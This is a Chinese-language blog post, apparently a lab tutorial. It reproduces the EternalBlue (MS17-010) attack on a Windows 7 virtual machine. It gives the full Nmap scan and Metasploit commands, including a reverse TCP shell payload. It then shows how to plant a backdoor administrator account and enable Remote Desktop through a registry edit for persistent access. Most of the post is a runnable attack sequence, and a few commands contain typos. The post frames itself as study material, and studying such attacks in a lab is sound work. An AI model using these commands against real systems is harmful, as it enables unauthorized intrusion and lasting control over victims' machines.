利用永恒之蓝漏洞拿win7最高权限

发表于 2019-05-03

1.永恒之蓝漏洞

1.漏洞编号 ：MS17_010
2.1漏洞简介
2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。

本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。

百度百科 ：

https://baike.baidu.com/item/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4951714?fr=aladdin

2.2漏洞描述

Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

2.3漏洞影响

目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。

2.复现过程

2.1 复现环境
角色 系统版本 IP 备注
攻击机 kali linux (64 bit) 192.168.43.242 nmap ,msf
靶机 windows7 (64 bit) 192.168.43.231 关闭防火墙
2.2 进入Nmap存放脚本的目录

2.3 利用nmap 扫描你要攻击的目标IP

命令 nmap –scriput smb-vuln-ms17-010.nse ‘这里写目标ip’

3.利用MSF攻击

3.1开启MSF

ect/init.d/posgresql start

msfconsole

3.2查询模块

search ms17-010

3.3使用exp

use exploit/windows/smb/ms17_010_eternalblue

查看需要设置的参数

show options

set rhost 192.168.43.231 设置目标IP

set payload generic/shell_reverse_tcp 加载payload（攻击载荷）

set lhost 192.168.43.242 设置监听ip

set lport 4444设置监听端口

run执行

进入到被入侵的win7终端

4.添加用户 留后门

net user hacker 123.com /add

4.1 给用户提权

net localgroup administrators hacker /add

4.2查看提权是否成功

net user hacker

5.开远程桌面

开启3389端口REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

在kali里面在打开一个终端

输入rdesktop 192.168.43.231

输入添加的用户名和密码

成功登陆~
